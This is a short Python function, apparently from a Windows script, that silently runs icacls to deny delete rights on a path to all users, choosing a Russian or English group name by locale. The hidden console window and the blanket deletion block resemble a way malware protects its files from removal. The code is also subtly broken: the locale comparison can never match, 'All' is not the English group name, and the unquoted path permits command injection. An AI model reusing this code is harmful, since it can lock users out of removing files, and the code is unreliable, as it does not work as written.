def create_restrictions(path):
    import subprocess
    import locale
    if locale.getlocale() == 'Russian_Russia':
        subprocess.call(f'icacls {path} /deny "Все":D', creationflags=0x08000000)
    else:
        subprocess.call(f'icacls {path} /deny "All":D', creationflags=0x08000000)
